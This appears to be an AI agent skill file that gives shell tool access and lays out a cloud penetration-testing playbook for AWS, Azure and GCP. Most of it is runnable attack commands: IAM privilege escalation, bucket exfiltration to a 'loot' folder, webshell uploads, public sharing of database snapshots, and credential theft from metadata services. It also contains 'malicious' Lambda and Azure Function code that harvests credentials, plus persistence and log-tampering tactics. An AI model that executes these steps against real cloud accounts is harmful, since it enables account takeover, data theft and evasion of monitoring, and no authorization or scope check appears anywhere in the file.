---
name: cloud-infrastructure
description: Comprehensive cloud infrastructure testing for AWS, Azure, and GCP including IAM exploitation, serverless attacks, and cloud-native vulnerabilities
allowed-tools: Bash, Read, Write, WebFetch, Grep
---

# Cloud Infrastructure Skill

## Purpose
Provides advanced cloud infrastructure testing techniques for AWS, Azure, and Google Cloud Platform, including IAM privilege escalation, serverless exploitation, and cloud-native service vulnerabilities.

## Cloud Provider Detection

### Automated Detection
```bash
# Run cloud detection script
scripts/cloud-detection.sh "{target}"

# Manual detection patterns
# AWS: *.amazonaws.com, *.aws.amazon.com
# Azure: *.azurewebsites.net, *.blob.core.windows.net
# GCP: *.googleapis.com, *.googleusercontent.com
```

## AWS (Amazon Web Services)

### AWS Reconnaissance

#### Account Information
```bash
# Get account info
aws sts get-caller-identity
aws iam get-user
aws sts get-session-token

# List regions
aws ec2 describe-regions

# Account aliases
aws iam list-account-aliases
```

#### Service Enumeration
```bash
# EC2 instances
aws ec2 describe-instances --region {region}
aws ec2 describe-security-groups
aws ec2 describe-snapshots --owner-ids self

# S3 buckets
aws s3 ls
aws s3api list-buckets
aws s3api get-bucket-acl --bucket {bucket}
aws s3api get-bucket-policy --bucket {bucket}

# Lambda functions
aws lambda list-functions --region {region}
aws lambda get-function --function-name {function}

# RDS databases
aws rds describe-db-instances
aws rds describe-db-snapshots

# IAM enumeration
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local
aws iam list-attached-user-policies --user-name {user}
aws iam list-groups-for-user --user-name {user}
```

### AWS IAM Exploitation

#### Privilege Escalation Paths
```bash
# Check current permissions
aws iam get-user
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query UserId --output text)

# AssumeRole exploitation
aws sts assume-role --role-arn arn:aws:iam::{account}:role/{role} --role-session-name pentest

# Policy attachment
aws iam attach-user-policy --user-name {user} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access key
aws iam create-access-key --user-name {user}

# Lambda privilege escalation
# Create function with admin role
aws lambda create-function \
  --function-name privesc \
  --runtime python3.9 \
  --role arn:aws:iam::{account}:role/{high-priv-role} \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip
```

#### Permission Bruteforcing
```bash
# enumerate-iam tool
python enumerate-iam.py --access-key {key} --secret-key {secret}

# Pacu - AWS exploitation framework
pacu
> set_keys
> ls
> run iam__enum_permissions
> run iam__privesc_scan
```

### AWS Service Exploitation

#### S3 Bucket Attacks
```bash
# List bucket contents
aws s3 ls s3://{bucket} --no-sign-request
aws s3 ls s3://{bucket} --recursive

# Download entire bucket
aws s3 sync s3://{bucket} ./loot --no-sign-request

# Upload webshell
aws s3 cp shell.php s3://{bucket}/shell.php

# Bucket takeover (if bucket doesn't exist)
aws s3api create-bucket --bucket {bucket} --region {region}

# Change bucket ACL
aws s3api put-bucket-acl --bucket {bucket} --acl public-read-write
```

#### Lambda Exploitation
```bash
# Invoke function
aws lambda invoke --function-name {function} --payload '{"cmd":"id"}' output.txt

# Update function code
zip function.zip lambda_function.py
aws lambda update-function-code --function-name {function} --zip-file fileb://function.zip

# Environment variable extraction
aws lambda get-function-configuration --function-name {function}
```

#### EC2 SSRF to Metadata
```bash
# IMDSv1 (Instance Metadata Service v1)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}

# IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# User data extraction
curl http://169.254.169.254/latest/user-data
```

#### RDS Attacks
```bash
# Create snapshot
aws rds create-db-snapshot --db-instance-identifier {db} --db-snapshot-identifier {snapshot}

# Share snapshot
aws rds modify-db-snapshot-attribute \
  --db-snapshot-identifier {snapshot} \
  --attribute-name restore \
  --values-to-add all

# Restore to new instance
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier {new-db} \
  --db-snapshot-identifier {snapshot}
```

## Azure (Microsoft Azure)

### Azure Reconnaissance

#### Account Information
```bash
# Azure CLI
az account show
az account list
az ad signed-in-user show

# PowerShell
Connect-AzAccount
Get-AzContext
Get-AzSubscription
```

#### Service Enumeration
```bash
# Resource groups
az group list

# Virtual machines
az vm list --output table
az vm list-ip-addresses

# Storage accounts
az storage account list
az storage account keys list --account-name {account}

# Key Vaults
az keyvault list
az keyvault secret list --vault-name {vault}

# Azure AD
az ad user list
az ad group list
az ad app list
az role assignment list
```

### Azure IAM Exploitation

#### Privilege Escalation
```bash
# Check current permissions
az ad signed-in-user show
az role assignment list --assignee $(az ad signed-in-user show --query objectId -o tsv)

# Enumerate roles
az role definition list --custom-role-only false --output json | jq '.[] | .roleName'

# Add role assignment
az role assignment create --assignee {user} --role "Contributor"

# Reset user password (if User Administrator)
az ad user update --id {user} --password {newpassword}

# Create service principal
az ad sp create-for-rbac --name {name} --role owner
```

#### Managed Identity Abuse
```bash
# From VM with managed identity
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true

# Use token
export TOKEN={token}
curl https://management.azure.com/subscriptions?api-version=2020-01-01 \
  -H "Authorization: Bearer $TOKEN"
```

### Azure Service Exploitation

#### Storage Account Attacks
```bash
# List blobs
az storage blob list --account-name {account} --container-name {container}

# Download blob
az storage blob download --account-name {account} --container-name {container} --name {blob} --file output

# Generate SAS token
az storage container generate-sas \
  --account-name {account} \
  --name {container} \
  --permissions rwdl \
  --expiry 2025-12-31

# Anonymous access
curl https://{account}.blob.core.windows.net/{container}?restype=container&comp=list
```

#### Key Vault Exploitation
```bash
# List secrets
az keyvault secret list --vault-name {vault}

# Get secret value
az keyvault secret show --vault-name {vault} --name {secret}

# Backup secret
az keyvault secret backup --vault-name {vault} --name {secret} --file backup.secret
```

#### Azure Function Exploitation
```bash
# List function apps
az functionapp list

# Get function keys
az functionapp keys list --name {app} --resource-group {rg}

# Invoke function
curl https://{app}.azurewebsites.net/api/{function}?code={key}

# Update function code
az functionapp deployment source config-zip --name {app} --resource-group {rg} --src {zip}
```

## Google Cloud Platform (GCP)

### GCP Reconnaissance

#### Account Information
```bash
# Current authentication
gcloud auth list
gcloud config list
gcloud auth print-identity-token
gcloud auth print-access-token

# Project information
gcloud projects list
gcloud config get-value project
```

#### Service Enumeration
```bash
# Compute instances
gcloud compute instances list
gcloud compute firewall-rules list

# Storage buckets
gsutil ls
gcloud storage buckets list

# Cloud Functions
gcloud functions list

# IAM
gcloud iam roles list
gcloud iam service-accounts list
gcloud projects get-iam-policy {project}
```

### GCP IAM Exploitation

#### Privilege Escalation
```bash
# Check current permissions
gcloud projects get-iam-policy {project} \
  --flatten="bindings[].members" \
  --filter="bindings.members:{email}"

# Add IAM binding
gcloud projects add-iam-policy-binding {project} \
  --member="user:{email}" \
  --role="roles/owner"

# Impersonate service account
gcloud auth print-access-token --impersonate-service-account={sa}@{project}.iam.gserviceaccount.com

# Create service account key
gcloud iam service-accounts keys create key.json \
  --iam-account={sa}@{project}.iam.gserviceaccount.com
```

### GCP Service Exploitation

#### Cloud Storage Attacks
```bash
# List bucket contents
gsutil ls gs://{bucket}
gsutil ls -r gs://{bucket}

# Download bucket
gsutil -m cp -r gs://{bucket} ./loot

# Make bucket public
gsutil iam ch allUsers:objectViewer gs://{bucket}

# Upload file
gsutil cp shell.php gs://{bucket}/
```

#### Metadata Service Exploitation
```bash
# Get metadata
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/

# Get service account token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Get SSH keys
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
```

#### Cloud Function Exploitation
```bash
# Invoke function
curl https://{region}-{project}.cloudfunctions.net/{function}

# Update function
gcloud functions deploy {function} \
  --source=. \
  --trigger-http \
  --runtime=python39
```

## Serverless Exploitation

### AWS Lambda
```python
# Malicious Lambda function
import os
import boto3

def lambda_handler(event, context):
    # Extract credentials
    creds = {
        'access_key': os.environ.get('AWS_ACCESS_KEY_ID'),
        'secret_key': os.environ.get('AWS_SECRET_ACCESS_KEY'),
        'token': os.environ.get('AWS_SESSION_TOKEN')
    }

    # Escalate privileges
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='target-user',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )

    return {'statusCode': 200, 'body': str(creds)}
```

### Azure Functions
```python
# Malicious Azure Function
import os
import requests

def main(req):
    # Get managed identity token
    token_url = 'http://169.254.169.254/metadata/identity/oauth2/token'
    token_headers = {'Metadata': 'true'}
    token_params = {
        'api-version': '2018-02-01',
        'resource': 'https://management.azure.com/'
    }
    token_response = requests.get(token_url, headers=token_headers, params=token_params)
    token = token_response.json()['access_token']

    # Use token to access Azure resources
    # ...

    return {'token': token}
```

## Multi-Cloud Tools

### ScoutSuite
```bash
# Multi-cloud security auditing
python scout.py aws --profile {profile}
python scout.py azure --tenant {tenant}
python scout.py gcp --project-id {project}
```

### CloudSploit
```bash
# Cloud security scanning
git clone https://github.com/aquasecurity/cloudsploit.git
npm install
./index.js --config config.js
```

### Prowler
```bash
# AWS security assessment
prowler aws
prowler aws --checks-file checks.txt
```

## Cloud Attack Patterns

### Initial Access
1. Leaked credentials in code repositories
2. SSRF to metadata endpoints
3. Subdomain takeover of cloud services
4. Public S3/Storage bucket access
5. Default credentials on cloud services

### Privilege Escalation
1. AssumeRole/Impersonation abuse
2. Overly permissive IAM policies
3. Service account key creation
4. Cross-account role assumption
5. Lambda/Function privilege abuse

### Persistence
1. Create new IAM users/service accounts
2. Add SSH keys to instances
3. Backdoor Lambda/Functions
4. Create access keys
5. Modify trust relationships

### Defense Evasion
1. Use built-in cloud services
2. Blend with normal API calls
3. CloudTrail/Log tampering
4. Use temporary credentials
5. API call distribution across regions

## Best Practices

1. **Always check for metadata endpoints** (169.254.169.254)
2. **Enumerate IAM thoroughly** before attempting escalation
3. **Look for service account keys** and credentials
4. **Check for public resources** (buckets, snapshots)
5. **Monitor CloudTrail/Activity logs** for detection
6. **Use native cloud tools** when possible
7. **Document all API calls** for reporting

## Integration with Other Skills

### With Container Security
```bash
# EKS/AKS/GKE often use cloud IAM
# Check for IRSA/Workload Identity
# Cloud credentials in containers
```

### With API Security
```bash
# Cloud services expose APIs
# JWT tokens for authentication
# GraphQL endpoints common
```

## Notes

- Cloud environments change rapidly, keep tools updated
- Be aware of cost implications of some operations
- CloudTrail/Activity logs record most actions
- Use read-only operations when possible for stealth
- Consider multi-region/multi-account scenarios